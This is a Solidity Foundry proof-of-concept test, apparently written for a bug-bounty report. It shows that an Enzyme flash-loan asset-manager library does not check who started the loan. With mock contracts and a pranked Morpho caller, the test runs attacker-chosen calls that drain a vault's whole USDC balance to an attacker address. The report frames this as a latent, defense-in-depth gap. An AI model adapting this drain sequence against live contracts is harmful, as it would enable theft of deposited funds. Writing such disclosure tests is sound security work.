// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.19;

/*
    PoC F-02 - MorphoBlueFlashLoanAssetManagerLib.onMorphoFlashLoan() does not
               validate the flash-loan initiator (unlike the Aave V3 variant).

    Target (Immunefi scope, "Enzyme Blue"):
      contracts/persistent/smart-accounts/morpho-blue-flash-loan-asset-manager/MorphoBlueFlashLoanAssetManagerLib.sol

    Why it matters:
      The asset-manager smart account is registered as an ASSET MANAGER of an Enzyme vault.
      onMorphoFlashLoan() executes attacker-supplied calls FROM that account, and there is
      no `_initiator == address(this)` check (compare with AaveV3FlashLoanAssetManagerLib:
      `if (_initiator != address(this)) revert ...UnauthorizedInitiator();`).

      Today Morpho Blue calls back `msg.sender` only (lib/morpho-blue/src/Morpho.sol:429),
      so the callback cannot be triggered by a third party -> LATENT defense-in-depth gap,
      not a live Critical. It becomes directly exploitable if the callback target is ever
      decoupled from the caller (a very common flash-loan-provider pattern -- it already
      happened for the Aave adapter, which is why that one has the initiator check).

    Run:
      forge test --match-path "tests/arena-poc/F02_MorphoFlashLoan_NoInitiatorCheck.t.sol" -vvv
*/

import {Test, console2} from "forge-std/Test.sol";

import {MorphoBlueFlashLoanAssetManagerLib} from
    "contracts/persistent/smart-accounts/morpho-blue-flash-loan-asset-manager/MorphoBlueFlashLoanAssetManagerLib.sol";
import {IMorphoBlueFlashLoanAssetManager} from
    "contracts/persistent/smart-accounts/morpho-blue-flash-loan-asset-manager/IMorphoBlueFlashLoanAssetManager.sol";
import {IERC20} from "contracts/external-interfaces/IERC20.sol";
import {ERC20} from "openzeppelin-solc-0.8/token/ERC20/ERC20.sol";

contract MockUSDC is ERC20 {
    constructor() ERC20("USD Coin", "USDC") {}

    function mint(address _to, uint256 _amount) external {
        _mint(_to, _amount);
    }
}

interface IMorphoBlueFlashLoanCallbackLike {
    function onMorphoFlashLoan(uint256 _assets, bytes calldata _data) external;
}

/// @dev Faithful model of Morpho Blue's flashLoan()
/// (lib/morpho-blue/src/Morpho.sol:422-432):
///   transfer assets to msg.sender -> callback on msg.sender -> pull assets back.
contract MockMorphoBlue {
    function flashLoan(address _token, uint256 _assets, bytes calldata _data) external {
        require(_assets != 0, "ZERO_ASSETS");

        IERC20(_token).transfer(msg.sender, _assets);

        IMorphoBlueFlashLoanCallbackLike(msg.sender).onMorphoFlashLoan(_assets, _data);

        IERC20(_token).transferFrom(msg.sender, address(this), _assets);
    }
}

/// @dev Minimal model of an Enzyme VaultProxy holding real tokens.
contract MockVault {
    mapping(address => bool) public isAssetManager;

    function setAssetManager(address _who, bool _isAssetManager) external {
        isAssetManager[_who] = _isAssetManager;
    }

    /// @dev no auth needed here: in production this is the accessor-only
    /// VaultProxy.withdrawAssetTo(); the check that matters for this PoC is
    /// canManageAssets() on the caller of the IntegrationManager.
    function withdraw(address _asset, address _to, uint256 _amount) external {
        IERC20(_asset).transfer(_to, _amount);
    }
}

/// @dev Minimal model of IntegrationManager.callOnIntegration(): only asset managers.
contract MockIntegrationManager {
    MockVault public immutable VAULT;

    constructor(MockVault _vault) {
        VAULT = _vault;
    }

    /// @dev Same auth check as IntegrationManager / ExternalPositionManager:
    ///      require(IVault(vaultProxy).canManageAssets(msg.sender))
    ///      msg.sender here is the smart account (the asset manager).
    function drain(address _asset, address _to, uint256 _amount) external {
        require(VAULT.isAssetManager(msg.sender), "NOT_ASSET_MANAGER");

        VAULT.withdraw(_asset, _to, _amount);
    }
}

contract F02_MorphoFlashLoan_NoInitiatorCheck is Test {
    MorphoBlueFlashLoanAssetManagerLib internal assetManager;
    MockMorphoBlue internal morpho;
    MockUSDC internal usdc;
    MockVault internal vault;
    MockIntegrationManager internal integrationManager;

    address internal constant ATTACKER = address(0xBAD);
    address internal constant SIGNER = address(0x5164E7);

    uint256 internal constant VAULT_TVL = 1_000_000e18;

    function setUp() public {
        morpho = new MockMorphoBlue();
        usdc = new MockUSDC();

        // The REAL Enzyme smart-account implementation.
        assetManager = new MorphoBlueFlashLoanAssetManagerLib(address(morpho));

        vault = new MockVault();
        assetManager.init(SIGNER, address(vault));

        integrationManager = new MockIntegrationManager(vault);

        // The smart account is registered as an asset manager of the vault
        // (that is the whole purpose of these accounts).
        vault.setAssetManager(address(assetManager), true);

        // Vault TVL
        usdc.mint(address(vault), VAULT_TVL);
    }

    function test_CallbackExecutesArbitraryCallsAsVaultAssetManager() public {
        console2.log("=== BEFORE ===");
        console2.log("vault USDC    :", usdc.balanceOf(address(vault)));
        console2.log("attacker USDC :", usdc.balanceOf(ATTACKER));

        IMorphoBlueFlashLoanAssetManager.Call[] memory calls = new IMorphoBlueFlashLoanAssetManager.Call[](2);

        // 1) move 1 wei to the smart account so the flash loan can be repaid
        calls[0] = IMorphoBlueFlashLoanAssetManager.Call({
            target: address(integrationManager),
            data: abi.encodeWithSelector(
                MockIntegrationManager.drain.selector, address(usdc), address(assetManager), 1
            )
        });

        // 2) drain the vault to the attacker
        calls[1] = IMorphoBlueFlashLoanAssetManager.Call({
            target: address(integrationManager),
            data: abi.encodeWithSelector(MockIntegrationManager.drain.selector, address(usdc), ATTACKER, VAULT_TVL)
        });

        bytes memory data = abi.encode(
            IMorphoBlueFlashLoanAssetManager.ForwardData({borrowedAssetAddress: address(usdc), calls: calls})
        );

        // Simulates a flash-loan provider whose callback target is decoupled from the
        // initiator. The adapter only checks `msg.sender == MORPHO` -> passes.
        vm.prank(address(morpho));
        assetManager.onMorphoFlashLoan(1, data);

        console2.log("=== AFTER ===");
        console2.log("vault USDC    :", usdc.balanceOf(address(vault)));
        console2.log("attacker USDC :", usdc.balanceOf(ATTACKER));

        assertEq(usdc.balanceOf(ATTACKER), VAULT_TVL, "vault drained through the flash-loan callback");
        assertEq(usdc.balanceOf(address(vault)), 0, "vault emptied");
    }
}
